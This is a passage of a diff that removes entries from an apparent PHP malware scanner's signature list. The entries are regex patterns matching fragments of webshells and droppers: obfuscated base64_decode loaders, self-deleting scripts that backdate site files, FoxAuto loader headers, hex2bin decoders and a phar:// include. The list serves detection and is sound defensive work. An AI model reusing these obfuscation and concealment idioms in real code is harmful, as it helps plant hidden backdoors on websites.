-      'pattern' => '/\\<\\?php echo "qBfTrbzhhU"; if \\(file_exists\\("\\.\\/message\\.php"\\)\\)\\{ touch\\("\\.\\/message\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*2EwKUbGp5f7/',
-      'label' => 'source-file tail snippet',
-    ),
-    485 => 
-    array (
-      'pattern' => '/\\<\\?php \\$zvqrtg\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$uxfqmwewwu\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpb/',
-      'label' => 'source-file tail snippet',
-    ),
-    486 => 
-    array (
-      'pattern' => '/\\<\\?php \\$unxfbkz\\=str_ireplace\\("x","","xxbxxxaxxxxsxxxexxx6xxxxx4xxx_xxxxxdxxexxcxxxoxxxxxdxxxxxexx"\\); \\$xsrwkt\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk/',
-      'label' => 'source-file tail snippet',
-    ),
-    487 => 
-    array (
-      'pattern' => '/\\<\\?php \\$yhhhrszgqz\\=str_ireplace\\("y","","ybyyyyayysyyyyeyyy6yyy4yyyyy_yyyyyydyyyyeyyyyycyyyoyydyyyyey"\\); \\$xkwdwx\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/',
-      'label' => 'source-file tail snippet',
-    ),
-    488 => 
-    array (
-      'pattern' => '/\\<\\?php \\$marczypp\\=str_ireplace\\("u","","uubuuuauuuusuuuueuu6uuuu4uuuu_uuuduuuueuuuucuuuuouuuuduuueu"\\); \\$gazmdgrcf\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/',
-      'label' => 'source-file tail snippet',
-    ),
-    489 => 
-    array (
-      'pattern' => '/\\<\\?php echo "kudZYyaRKB"; if \\(file_exists\\("\\.\\/preview\\.php"\\)\\)\\{ touch\\("\\.\\/preview\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*4ecDGXpfqKN/',
-      'label' => 'source-file tail snippet',
-    ),
-    490 => 
-    array (
-      'pattern' => '/\\<\\?php \\$unfstzz\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$machr\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlfc/',
-      'label' => 'source-file tail snippet',
-    ),
-    491 => 
-    array (
-      'pattern' => '/\\<\\?php \\$gqcqgtr\\=str_ireplace\\("y","","yyybyyyayyyysyyyyeyyyy6yyyy4yyyy_yydyyyyyyeyyycyyyyoyyyydyyeyy"\\); \\$caaxq\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/',
-      'label' => 'source-file tail snippet',
-    ),
-    492 => 
-    array (
-      'pattern' => '/\\<\\?php \\$xnaynvs\\=str_ireplace\\("f","","ffbfffaffsfffffefff6ffffff4ffff_fffdffffefffffcfffofffffdfffefff"\\); \\$rcbacsmyc\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
-      'label' => 'source-file tail snippet',
-    ),
-    493 => 
-    array (
-      'pattern' => '/LypkcWhyeWNndmRxZWV3bnYqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJd/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    494 => 
-    array (
-      'pattern' => '/\\<\\?php \\$vwmbwqk\\=str_ireplace\\("n","","nnnbnnnnnannnnsnnnnennnn6nnn4nn_nnnndnnennnncnnnonnnnndnnnnenn"\\); \\$mkmmvcu\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/',
-      'label' => 'source-file tail snippet',
-    ),
-    495 => 
-    array (
-      'pattern' => '/\\$?phpinfo\\b/',
-      'label' => 'sample-specific identifier',
-    ),
-    496 => 
-    array (
-      'pattern' => '/LypxZHdkc2FiZmR2dXd6ZyovIGlmICghZW1wdHkoJF9HRVQpICYmIGlzc2V0KCRfR0VUWyJtb2RlIl0p/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    497 => 
-    array (
-      'pattern' => '/\\<\\?php \\$yacheqy\\=str_ireplace\\("q","","qqqbqqqqqqaqqqqsqqqqqqeqqqq6qqqq4qqqqq_qqqdqqeqqqcqqqqoqqqqdqqqqqeqqq"\\); \\$cdevs\\="DQoJCUBlcnJvcl9yZXBvcnR/',
-      'label' => 'source-file tail snippet',
-    ),
-    498 => 
-    array (
-      'pattern' => '/\\<\\?php \\$fwpdvehz\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$ukryqd\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbml/',
-      'label' => 'source-file tail snippet',
-    ),
-    499 => 
-    array (
-      'pattern' => '/\\<\\?php echo "sbBfEZCYpy"; if \\(file_exists\\("\\.\\/tcntacc\\.php"\\)\\)\\{ touch\\("\\.\\/tcntacc\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*Dx2v0n6S5wQ/',
-      'label' => 'source-file tail snippet',
-    ),
-    500 => 
-    array (
-      'pattern' => '/\\<\\?php \\$rfacrppx\\=str_ireplace\\("n","","nbnnnnannnnnsnnennn6nnnn4nnnn_nnnndnnnnennnnncnnonnnndnnnnen"\\); \\$ewnmagu\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoM/',
-      'label' => 'source-file tail snippet',
-    ),
-    501 => 
-    array (
-      'pattern' => '/\\<\\?php echo "BbYtDFKCVC"; if \\(file_exists\\("\\.\\/user_login\\.php"\\)\\)\\{ touch\\("\\.\\/user_login\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*sUhkd/',
-      'label' => 'source-file tail snippet',
-    ),
-    502 => 
-    array (
-      'pattern' => '/\\<\\?php \\$yntavbd\\=str_ireplace\\("x","","xbxxxxxaxxxsxxexxx6xxx4xxxxx_xxxdxxxxexxxxxcxxxoxxxxdxxxexxx"\\); \\$ttawhe\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk/',
-      'label' => 'source-file tail snippet',
-    ),
-    503 => 
-    array (
-      'pattern' => '/\\<\\?php \\$sdhgys\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$nstsgbvubx\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpb/',
-      'label' => 'source-file tail snippet',
-    ),
-    504 => 
-    array (
-      'pattern' => '/\\<\\?php echo "TkZGKxqFRR"; if \\(file_exists\\("\\.\\/page\\-36\\.php"\\)\\)\\{ touch\\("\\.\\/page\\-36\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*B8C8wnEU3fb/',
-      'label' => 'source-file tail snippet',
-    ),
-    505 => 
-    array (
-      'pattern' => '/\\<\\?php echo "BaVuuVECTe"; if \\(file_exists\\("\\.\\/deptodoc\\.php"\\)\\)\\{ touch\\("\\.\\/deptodoc\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*5uYE73dBu/',
-      'label' => 'source-file tail snippet',
-    ),
-    506 => 
-    array (
-      'pattern' => '/\\<\\?php echo "GpcXAVbEtV"; if \\(file_exists\\("\\.\\/m5_checkout\\.php"\\)\\)\\{ touch\\("\\.\\/m5_checkout\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*3X4/',
-      'label' => 'source-file tail snippet',
-    ),
-    507 => 
-    array (
-      'pattern' => '/No configuration file found and no installation code available\\. Exiting\\.\\.\\.[\\s\\S]{0,160}No received stream wbn configuration data\\. Exiting\\.\\.\\./',
-      'label' => 'sample-specific literal chain',
-    ),
-    508 => 
-    array (
-      'pattern' => '/\\<\\?php \\$yssdv\\=str_ireplace\\("p","","ppbppppappppsppppeppppp6ppppp4ppppp_ppppppdppppppeppppppcppppoppppdppppppep"\\); \\$cywrsusf\\="DQoJCUBlcnJvcl9y/',
-      'label' => 'source-file tail snippet',
-    ),
-    509 => 
-    array (
-      'pattern' => '/\\<\\?php \\$atkrync\\=str_ireplace\\("f","","fbfffaffffffsfffefffff6ff4ffffff_ffffdfffeffffcffffoffdfffffeff"\\); \\$mechmu\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/',
-      'label' => 'source-file tail snippet',
-    ),
-    510 => 
-    array (
-      'pattern' => '/\\<\\?php \\$bzbfaxzrb\\=str_ireplace\\("r","","rbrrrrrarrrrrrsrrrrerrrr6rrrrr4rrrrrr_rrrrrrdrrrrerrrcrrrrorrrrrrdrrrrer"\\); \\$ygxnztamke\\="DQoJCUBlcnJvc/',
-      'label' => 'source-file tail snippet',
-    ),
-    511 => 
-    array (
-      'pattern' => '/\\<\\?php \\$sztcs\\=str_ireplace\\("q","","qbqqqqqqaqqsqqqqqqeqqqqq6qqqqqq4qqq_qqqdqqqqeqqcqqqqoqqqqdqqqqeq"\\); \\$twpdsmhbyh\\="DQoJCUBlcnJvcl9yZXBvcnRpb/',
-      'label' => 'source-file tail snippet',
-    ),
-    512 => 
-    array (
-      'pattern' => '/\\<\\?php \\$rnafu\\=str_ireplace\\("k","","kkkbkkkkakkkkkskkkkekkkkkk6kkkkk4kk_kkkkdkkkekkkkkckkkkokkkkkkdkkkkekkk"\\); \\$gyyxpsmzkg\\="DQoJCUBlcnJvcl9yZX/',
-      'label' => 'source-file tail snippet',
-    ),
-    513 => 
-    array (
-      'pattern' => '/\\<\\?php \\$yufcysp\\=str_ireplace\\("m","","mmmbmmammmmsmmemmm6mmmmmm4mmmm_mmmmdmmmmmmemmmmmcmmmommmmdmmmmmmem"\\); \\$enpqahene\\="DQoJCUBlcnJvcl9yZXBvcn/',
-      'label' => 'source-file tail snippet',
-    ),
-    514 => 
-    array (
-      'pattern' => '/\\<\\?php \\$xfrckhes\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$mybdag\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbml/',
-      'label' => 'source-file tail snippet',
-    ),
-    515 => 
-    array (
-      'pattern' => '/\\<\\?php \\$uwwckvnecz\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$qbqdnatetn\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJC/',
-      'label' => 'source-file tail snippet',
-    ),
-    516 => 
-    array (
-      'pattern' => '/\\<\\?php \\$uwqbxpy\\=str_ireplace\\("z","","zzzbzzzazzzzzzszzzzzezzzzzz6zzzzz4zzzz_zzzzdzzzezzzczzzzozzzdzzzzzezz"\\); \\$apsgyfpa\\="DQoJCUBlcnJvcl9yZXBv/',
-      'label' => 'source-file tail snippet',
-    ),
-    517 => 
-    array (
-      'pattern' => '/\\<\\?php \\$cymvpxt\\=str_ireplace\\("g","","gggbggggaggggsgggggeggggg6gggg4gg_gggggdggggeggggggcggggogggdggeg"\\); \\$ktwwpchwe\\="DQoJCUBlcnJvcl9yZXBvcnR/',
-      'label' => 'source-file tail snippet',
-    ),
-    518 => 
-    array (
-      'pattern' => '/\\<\\?php \\$ntawv\\=str_ireplace\\("u","","uuubuuuauuusuueuuuuu6uuuu4uuu_uuuuuduueuucuuuuouuuuuduuuuueu"\\); \\$wyebagtu\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk/',
-      'label' => 'source-file tail snippet',
-    ),
-    519 => 
-    array (
-      'pattern' => '/\\<\\?php echo "tAsBqFFsRG"; if \\(file_exists\\("\\.\\/publicidad\\.php"\\)\\)\\{ touch\\("\\.\\/publicidad\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*cF6vM/',
-      'label' => 'source-file tail snippet',
-    ),
-    520 => 
-    array (
-      'pattern' => '/\\<\\?php echo "QrPhvSDwkP"; if \\(file_exists\\("\\.\\/config\\.sum\\.php"\\)\\)\\{ touch\\("\\.\\/config\\.sum\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*h8AbE/',
-      'label' => 'source-file tail snippet',
-    ),
-    521 => 
-    array (
-      'pattern' => '/\',\\$errstr\\); array_map\\(\\$ggmkxsawurdyqc,array\\([\\s\\S]{0,160}GMT"\\);
-\\/\\/header\\(/',
-      'label' => 'sample-specific literal chain',
-    ),
-    522 => 
-    array (
-      'pattern' => '/\\<\\?php echo "VgHgHbtMcK"; if \\(file_exists\\("\\.\\/pv_de_recette\\.php"\\)\\)\\{ touch\\("\\.\\/pv_de_recette\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\//',
-      'label' => 'source-file tail snippet',
-    ),
-    523 => 
-    array (
-      'pattern' => '/\\<\\?php \\$fqkzgtt\\=str_ireplace\\("k","","kkkbkkakkkkkskkekk6kkkkk4kk_kkkkkdkkekkkkkckkkkkokkkdkkkkkekk"\\); \\$ryevfgueb\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
-      'label' => 'source-file tail snippet',
-    ),
-    524 => 
-    array (
-      'pattern' => '/\\<\\?php \\$nmrwdtvncu\\=str_ireplace\\("u","","uubuuuauuuusuuuueuu6uuuu4uuuu_uuuduuuueuuuucuuuuouuuuduuueu"\\); \\$wugfx\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/',
-      'label' => 'source-file tail snippet',
-    ),
-    525 => 
-    array (
-      'pattern' => '/\\<\\?php \\$ecnsxuthgy\\=str_ireplace\\("p","","pbppppappsppeppppp6ppp4ppp_pppdpppppepppcpppppoppppdpppep"\\); \\$qhrvck\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk/',
-      'label' => 'source-file tail snippet',
-    ),
-    526 => 
-    array (
-      'pattern' => '/\\<\\?php \\$seufa\\=str_ireplace\\("f","","fffbffaffsffffefff6ffff4fff_ffffdffefffffcfffofffffdfffffef"\\); \\$smxptf\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQ/',
-      'label' => 'source-file tail snippet',
-    ),
-    527 => 
-    array (
-      'pattern' => '/\\<\\?php \\$esfnctr\\=str_ireplace\\("x","","xxbxxxaxxxxsxxxexxx6xxxxx4xxx_xxxxxdxxexxcxxxoxxxxxdxxxxxexx"\\); \\$kteyrsepb\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/',
-      'label' => 'source-file tail snippet',
-    ),
-    528 => 
-    array (
-      'pattern' => '/\\<\\?php echo "QWznfDAaxU"; if \\(file_exists\\("\\.\\/cataloguesearch\\.php"\\)\\)\\{ touch\\("\\.\\/cataloguesearch\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__/',
-      'label' => 'source-file tail snippet',
-    ),
-    529 => 
-    array (
-      'pattern' => '/LyprdXF4c2YqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJdKSl7LypycHZy/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    530 => 
-    array (
-      'pattern' => '/\\<\\?php \\$bnqztzrrdy\\=str_ireplace\\("k","","kkkbkkkkakkkkkskkkkekkkkkk6kkkkk4kk_kkkkdkkkekkkkkckkkkokkkkkkdkkkkekkk"\\); \\$msupuh\\="DQoJCUBlcnJvcl9yZ/',
-      'label' => 'source-file tail snippet',
-    ),
-    531 => 
-    array (
-      'pattern' => '/\\<\\?php \\$mcunf\\=str_ireplace\\("g","","gggbgggggagggggsggggeggg6gg4gggg_ggggdgggegggggcgggggoggggdgggegg"\\); \\$tytcnrzsnv\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
-      'label' => 'source-file tail snippet',
-    ),
-    532 => 
-    array (
-      'pattern' => '/\\<\\?php \\$vvbxwx\\=str_ireplace\\("w","","wwwbwwwwawwwswwwewwwwww6www4www_wwwwdwwwwwwewwwwwcwwwwowwwdwwwweww"\\); \\$udvsrefgbr\\="DQoJCUBlcnJvcl9yZXBvcn/',
-      'label' => 'source-file tail snippet',
-    ),
-    533 => 
-    array (
-      'pattern' => '/\\<\\?php echo "qaTTeUhRBQ"; if \\(file_exists\\("\\.\\/sendtomobile\\.php"\\)\\)\\{ touch\\("\\.\\/sendtomobile\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*c/',
-      'label' => 'source-file tail snippet',
-    ),
-    534 => 
-    array (
-      'pattern' => '/\\<\\?php \\$zcrktm\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$kwvtra\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlfc/',
-      'label' => 'source-file tail snippet',
-    ),
-    535 => 
-    array (
-      'pattern' => '/\\<\\?php echo "gZkzTNaUDf"; if \\(file_exists\\("\\.\\/youve_lib\\.php"\\)\\)\\{ touch\\("\\.\\/youve_lib\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*b16hcar/',
-      'label' => 'source-file tail snippet',
-    ),
-    536 => 
-    array (
-      'pattern' => '/\\);\\$kyrmtp\\=\\$nxfbege\\(\\$rnsehtnxe\\);user_error\\(\\$kyrmtp,E_USER_ERROR\\);
-
-\\/\\/ Set the root path as a constant\\.
-if \\(\\!defined\\(/',
-      'label' => 'sample-specific literal',
-    ),
-    537 => 
-    array (
-      'pattern' => '/\\<\\?php \\$zqymm\\=str_ireplace\\("i","","ibiiiaiiiisiieiiiii6iiiiii4ii_iiidiiiieiiiiiiciiiiioiiiidiiiiiieiii"\\); \\$fndddfhsc\\="DQoJCUBlcnJvcl9yZXBvcnR/',
-      'label' => 'source-file tail snippet',
-    ),
-    538 => 
-    array (
-      'pattern' => '/\\<\\?php \\$svrhd\\=str_ireplace\\("k","","kkkbkkakkkkkkskkkkekkkkk6kkkkkk4kkkkk_kkkkkdkkkkkkekkckkokkkkdkkkekk"\\); \\$vbpecmd\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
-      'label' => 'source-file tail snippet',
-    ),
-    539 => 
-    array (
-      'pattern' => '/Lyp4dXZneXZhcm1nYmsqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJdKSl7/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    540 => 
-    array (
-      'pattern' => '/LypnbXJid2hkcnJnZWUqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJdKSl7/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    541 => 
-    array (
-      'pattern' => '/\\<\\?php echo "SEUgbUeBmF"; if \\(file_exists\\("\\.\\/init\\.Saturday\\.php"\\)\\)\\{ touch\\("\\.\\/init\\.Saturday\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\//',
-      'label' => 'source-file tail snippet',
-    ),
-    542 => 
-    array (
-      'pattern' => '/\\<\\?php echo "EzWFhefkQU"; if \\(file_exists\\("\\.\\/credits\\.php"\\)\\)\\{ touch\\("\\.\\/credits\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*fdnadZFfM4Z/',
-      'label' => 'source-file tail snippet',
-    ),
-    543 => 
-    array (
-      'pattern' => '/\\<\\?php echo "taPQSBBzBC"; if \\(file_exists\\("\\.\\/config\\.immediately\\.php"\\)\\)\\{ touch\\("\\.\\/config\\.immediately\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__/',
-      'label' => 'source-file tail snippet',
-    ),
-    544 => 
-    array (
-      'pattern' => '/\\<\\?php \\$qrtwsx\\=str_ireplace\\("u","","ubuuuuauuuuusuuuuueuuu6uu4uuuuu_uuduuuueuuucuuuuouuuuduuuueuu"\\); \\$zbyknzx\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/',
-      'label' => 'source-file tail snippet',
-    ),
-    545 => 
-    array (
-      'pattern' => '/\\<\\?php \\$rybdsftgz\\=str_ireplace\\("y","","yyybyyyayyyysyyyyeyyyy6yyyy4yyyy_yydyyyyyyeyyycyyyyoyyyydyyeyy"\\); \\$kxmtdv\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
-      'label' => 'source-file tail snippet',
-    ),
-    546 => 
-    array (
-      'pattern' => '/LypraHpoYmZhd3lza3JiKi8gaWYgKCFlbXB0eSgkX0dFVCkgJiYgaXNzZXQoJF9HRVRbIm1vZGUiXSkp/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    547 => 
-    array (
-      'pattern' => '/\\<\\?php \\$wcbbwngd\\=str_ireplace\\("g","","gggbgggggagggggsggggeggg6gg4gggg_ggggdgggegggggcgggggoggggdgggegg"\\); \\$gxcdfqc\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
-      'label' => 'source-file tail snippet',
-    ),
-    548 => 
-    array (
-      'pattern' => '/\\<\\?php \\$gznwg\\=str_ireplace\\("i","","ibiiiaiiiisiieiiiii6iiiiii4ii_iiidiiiieiiiiiiciiiiioiiiidiiiiiieiii"\\); \\$vrayhzgk\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
-      'label' => 'source-file tail snippet',
-    ),
-    549 => 
-    array (
-      'pattern' => '/\\<\\?php echo "FrmaKXuSWk"; if \\(file_exists\\("\\.\\/statistic\\.php"\\)\\)\\{ touch\\("\\.\\/statistic\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*A23RGPe/',
-      'label' => 'source-file tail snippet',
-    ),
-    550 => 
-    array (
-      'pattern' => '/\\<\\?php error_reporting\\(0\\); if\\(file_exists\\("\\.user\\.ini"\\)\\)\\{ unlink\\("\\.user\\.ini"\\); \\} echo "FoxAutoV4 , Download \\=\\> anonymousfox\\.com\\\\n"; \\$code \\= \\$_/',
-      'label' => 'source-file tail snippet',
-    ),
-    551 => 
-    array (
-      'pattern' => '/H\\*", \\$k\\);
-	\\$_POST\\[\\$kk\\]\\=@pack\\(/',
-      'label' => 'sample-specific literal',
-    ),
-    552 => 
-    array (
-      'pattern' => '/function _tuLk\\(\\$_MENGj\\)\\{\\$_MENGj\\=substr\\(\\$_MENGj,\\(int\\)\\(hex2bin\\(\'373532\'\\)\\)\\);\\$_MENGj\\=substr\\(\\$_MENGj,\\(int\\)\\(hex2bin\\(\'30\'\\)\\),\\(int\\)\\(hex2bin\\(\'2d363737/',
-      'label' => 'source-file tail snippet',
-    ),
-    553 => 
-    array (
-      'pattern' => '/;
-
-\\$wpautop \\= pre_admin_bar\\( \\$wp_kses_data, \\$wp_nonce \\);
-
-if\\( isset\\( \\$wpautop \\) \\)\\{
-	if\\( isset\\(\\$_POST\\[[\\s\\S]{0,160}\\] \\);
-	\\$shortcode_unautop \\= create_function\\(/',
-      'label' => 'sample-specific literal chain',
-    ),
-    554 => 
-    array (
-      'pattern' => '/function mp8Gs\\(\\$NGHVp, \\$gmSp_ \\= \'\'\\) \\{ \\$Ag26T \\= \\$NGHVp; \\$xA0M4 \\= \'\'; for \\(\\$RkYMw \\= 0; \\$RkYMw \\< strlen\\(\\$Ag26T\\);\\) \\{ for \\(\\$IohcI \\= 0; \\$IohcI \\< s/',
-      'label' => 'source-file head snippet',
-    ),
-    555 => 
-    array (
-      'pattern' => '/function _v4XU\\(\\$_Lm9n9m\\)\\{\\$_Lm9n9m\\=substr\\(\\$_Lm9n9m,\\(int\\)\\(hex2bin\\(\'363430\'\\)\\)\\);\\$_Lm9n9m\\=substr\\(\\$_Lm9n9m,\\(int\\)\\(hex2bin\\(\'30\'\\)\\),\\(int\\)\\(hex2bin\\(\'2d3/',
-      'label' => 'source-file tail snippet',
-    ),
-    556 => 
-    array (
-      'pattern' => '/function _F8hp\\(\\$_MqNNym1xo\\)\\{\\$_MqNNym1xo\\=substr\\(\\$_MqNNym1xo,\\(int\\)\\(hex2bin\\(\'31303139\'\\)\\)\\);\\$_MqNNym1xo\\=substr\\(\\$_MqNNym1xo,\\(int\\)\\(hex2bin\\(\'30\'\\)\\),\\(/',
-      'label' => 'source-file tail snippet',
-    ),
-    557 => 
-    array (
-      'pattern' => '/\',\\$check_url_arry\\[\\$m\\]\\);
- 			\\$check_url_cont1\\.\\=\\$http1\\.\\$_SERVER\\["HTTP_HOST"\\]\\.str_replace\\(BASE_PATH,[\\s\\S]{0,160},\\$check_url_arry1\\[0\\]\\);
- 		\\$check_url_cont1\\.\\=\\$http1\\.\\$_SERVER\\["HTTP_HOST"\\]\\.str_replace\\(BASE_PATH,/',
-      'label' => 'sample-specific literal chain',
-    ),
-    558 => 
-    array (
-      'pattern' => '/\\];
-                  \\$p\\=trim\\(base64_decode\\(\\$s2\\)\\);\\$di\\=dirname\\(\\$p\\);
-                  \\$fi\\=basename\\(\\$p\\);\\$o\\=\\$_SERVER\\[[\\s\\S]{0,160};
-                  \\$c\\=b1\\(\\$u\\);
-                  echo \\$c;
-                  echo/',
-      'label' => 'sample-specific literal chain',
-    ),
-    559 => 
-    array (
-      'pattern' => '/\\<script type\\="text\\/javascript" defer\\>function VsX\\(\\)\\{ll\\=false;var Jlm\\=new Image\\(\\);Object\\.defineProperty\\(Jlm,\'id\',\\{get\\:function\\(\\)\\{ll\\=true;\\}\\}\\);/',
-      'label' => 'source-file tail snippet',
-    ),
-    560 => 
-    array (
-      'pattern' => '/\\$lyqiphm \\= \'d6g7x8tkc2msb\\-\\#y3f\\\\\'\\*H409_eupvaoinl1r\';\\$eiakf \\= Array\\(\\);\\$eiakf\\[\\] \\= \\$lyqiphm\\[8\\]\\.\\$lyqiphm\\[35\\]\\.\\$lyqiphm\\[25\\]\\.\\$lyqiphm\\[29\\]\\.\\$lyqiphm\\[6/',
-      'label' => 'source-file tail snippet',
-    ),
-    561 => 
-    array (
-      'pattern' => '/\\$wpgeiqt \\= \'mskyp4rlgtu7bv9_0n8Hcao1\\*\\#d\\\\\'iex2f\\-\';\\$kakfshy \\= Array\\(\\);\\$kakfshy\\[\\] \\= \\$wpgeiqt\\[20\\]\\.\\$wpgeiqt\\[6\\]\\.\\$wpgeiqt\\[29\\]\\.\\$wpgeiqt\\[21\\]\\.\\$wpgeiqt/',
-      'label' => 'source-file tail snippet',
-    ),
-    562 => 
-    array (
-      'pattern' => '/\\$vzalnkg \\= \'\\#oxl7ya\\*03vntcd1ebk85i\\\\\'sr2fHup4g_m\\-\';\\$rwmdcde \\= Array\\(\\);\\$rwmdcde\\[\\] \\= \\$vzalnkg\\[26\\]\\.\\$vzalnkg\\[4\\]\\.\\$vzalnkg\\[15\\]\\.\\$vzalnkg\\[26\\]\\.\\$vzalnk/',
-      'label' => 'source-file tail snippet',
-    ),
-    563 => 
-    array (
-      'pattern' => '/\\$tgmgfol \\= \'tkda4cpgHm0f1\\-\\#v7ursy3xln6b9ei\\\\\'\\*_o\';\\$ewnavqg \\= Array\\(\\);\\$ewnavqg\\[\\] \\= \\$tgmgfol\\[5\\]\\.\\$tgmgfol\\[18\\]\\.\\$tgmgfol\\[28\\]\\.\\$tgmgfol\\[3\\]\\.\\$tgmgfol\\[/',
-      'label' => 'source-file tail snippet',
-    ),
-    564 => 
-    array (
-      'pattern' => '/\\$1\\$2\', \\$pref_old\\);
-				\\$pref_new \\= preg_replace\\([\\s\\S]{0,160}, \'\\$1\\<span class\\="columns\\-prefs\\-icon"\\>\\<\\/span\\>\\$2/',
-      'label' => 'sample-specific literal chain',
-    ),
-    565 => 
-    array (
-      'pattern' => '/include \'phar\\:\\/\\/readme\\.txt\\/readme\\.txt\';/',
-      'label' => 'source-file tail snippet',
-    ),
-    566 => 
-    array (
-      'pattern' => '/\\$dpfghee \\= \'_ane\\\\\'cs1o2xyglm54\\*dtHvbk8\\-p60\\#rfu7i9\';\\$nvmasxg \\= Array\\(\\);\\$nvmasxg\\[\\] \\= \\$dpfghee\\[5\\]\\.\\$dpfghee\\[30\\]\\.\\$dpfghee\\[3\\]\\.\\$dpfghee\\[1\\]\\.\\$dpfghee/',
-      'label' => 'source-file tail snippet',
-    ),
-    567 => 
-    array (
-      'pattern' => '/\\<\\?php \\/\\* FoxAuto \\*\\/ error_reporting\\(0\\); function vepa_\\(\\$cmx0T\\) \\{ \\$o6akB \\= strlen\\(trim\\(\\$cmx0T\\)\\); \\$nYANr \\= \'\'; for \\(\\$lv38F \\= 0; \\$lv38F \\< \\$o6ak/',
-      'label' => 'source-file tail snippet',
-    ),
-    568 => 
-    array (
-      'pattern' => '/\\<\\?php error_reporting\\(0\\); function Momdo\\(\\$T1R7y\\) \\{ \\$CyJ4O \\= strlen\\(trim\\(\\$T1R7y\\)\\); \\$yB2qC \\= \'\'; for \\(\\$srffE \\= 0; \\$srffE \\< \\$CyJ4O; \\$srffE \\+\\= 2/',
-      'label' => 'source-file tail snippet',
-    ),
-    569 => 
-    array (
-      'pattern' => '/\\$?e6e6e6\\b/',
-      'label' => 'sample-specific identifier',
-    ),
-    570 => 
-    array (
-      'pattern' => '/email\'\\]\\?\\>"required \\>
-
-	\\<input type\\="submit" value\\="Send test \\>\\>"\\>
-
-\\<\\/form\\>
